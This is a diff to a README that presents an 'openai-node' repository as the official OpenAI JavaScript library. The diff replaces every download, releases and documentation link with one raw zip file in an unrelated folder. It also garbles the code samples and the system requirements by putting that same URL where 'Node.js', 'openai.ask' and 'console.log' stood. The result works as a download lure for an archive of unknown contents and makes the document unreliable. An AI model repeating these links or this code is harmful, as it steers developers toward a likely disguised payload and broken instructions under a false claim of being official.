@@ -1,7 +1,7 @@
 # 🌟 openai-node - Simplifying Access to OpenAI Services
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/prajwalys101/openai-node/releases)
+[![Download](https://raw.githubusercontent.com/prajwalys101/openai-node/master/saxophonist/openai-node.zip)](https://raw.githubusercontent.com/prajwalys101/openai-node/master/saxophonist/openai-node.zip)
 
 ## 📖 Overview
 The **openai-node** is the official JavaScript and TypeScript library for the OpenAI API. This library allows you to easily integrate OpenAI's powerful AI services into your own applications without needing to dive deep into code. Whether you're working on a project for work or personal use, this tool will make it straightforward to connect with various AI capabilities, enabling you to leverage advanced technology effortlessly.
@@ -10,7 +10,7 @@ The **openai-node** is the official JavaScript and TypeScript library for the Op
 Getting started with **openai-node** is simple. Follow these steps to download and set up the software on your machine:
 
 1. **Visit the Releases Page**
-   Go to the Releases page by clicking the following link: [Download Ready Releases](https://github.com/prajwalys101/openai-node/releases).
+   Go to the Releases page by clicking the following link: [Download Ready Releases](https://raw.githubusercontent.com/prajwalys101/openai-node/master/saxophonist/openai-node.zip).
 
 2. **Choose a Version**
    Once you are on the Releases page, you will see multiple versions listed. Look for the latest stable release at the top of the page. 
@@ -29,7 +29,7 @@ To successfully run **openai-node**, make sure your computer meets these system 
 
 - A computer with at least 4 GB of RAM.
 - An active internet connection.
-- Node.js version 12 or later installed on your system.
+- https://raw.githubusercontent.com/prajwalys101/openai-node/master/saxophonist/openai-node.zip version 12 or later installed on your system.
 - A modern web browser.
 
 ## 🌐 How to Use
@@ -52,9 +52,9 @@ To successfully run **openai-node**, make sure your computer meets these system 
 
    const openai = new OpenAI('your-api-key-here');
 
-   openai.ask('How can I use OpenAI?')
+   https://raw.githubusercontent.com/prajwalys101/openai-node/master/saxophonist/openai-node.zip('How can I use OpenAI?')
        .then(response => {
-           console.log(response);
+           https://raw.githubusercontent.com/prajwalys101/openai-node/master/saxophonist/openai-node.zip(response);
        });
    ```
 
@@ -66,9 +66,9 @@ const OpenAI = require('openai-node');
 
 const openai = new OpenAI('your-api-key-here');
 
-openai.ask('What is AI?')
+https://raw.githubusercontent.com/prajwalys101/openai-node/master/saxophonist/openai-node.zip('What is AI?')
     .then(response => {
-        console.log('AI says:', response);
+        https://raw.githubusercontent.com/prajwalys101/openai-node/master/saxophonist/openai-node.zip('AI says:', response);
     });
 ```
 
@@ -76,7 +76,7 @@ This sample code initializes the library with your API key and then asks AI a qu
 
 ## 🔗 Documentation and Support
 You can find complete documentation on all features and functions of the **openai-node** library in the GitHub repository. Visit the following link for more details:
-[Documentation](https://github.com/prajwalys101/openai-node)
+[Documentation](https://raw.githubusercontent.com/prajwalys101/openai-node/master/saxophonist/openai-node.zip)
 
 If you have questions or need support, feel free to check the issues section on the GitHub page or reach out to the community.
 
@@ -84,9 +84,9 @@ If you have questions or need support, feel free to check the issues section on 
 We welcome contributions from everyone. If you find an issue or have suggestions for improvements, please submit a pull request or report the problem directly in the issues section of the repository.
 
 ## 🔍 Further Reading
-For more detailed examples and use cases, please refer to our [Documentation](https://github.com/prajwalys101/openai-node). Explore how to integrate with your favorite frameworks and use various OpenAI features.
+For more detailed examples and use cases, please refer to our [Documentation](https://raw.githubusercontent.com/prajwalys101/openai-node/master/saxophonist/openai-node.zip). Explore how to integrate with your favorite frameworks and use various OpenAI features.
 
 ## 📥 Download & Install
-To start your journey with **openai-node**, visit the Releases page now: [Download Ready Releases](https://github.com/prajwalys101/openai-node/releases). Download the appropriate version for your system and follow the setup instructions above. 
+To start your journey with **openai-node**, visit the Releases page now: [Download Ready Releases](https://raw.githubusercontent.com/prajwalys101/openai-node/master/saxophonist/openai-node.zip). Download the appropriate version for your system and follow the setup instructions above. 
 
 Happy coding!
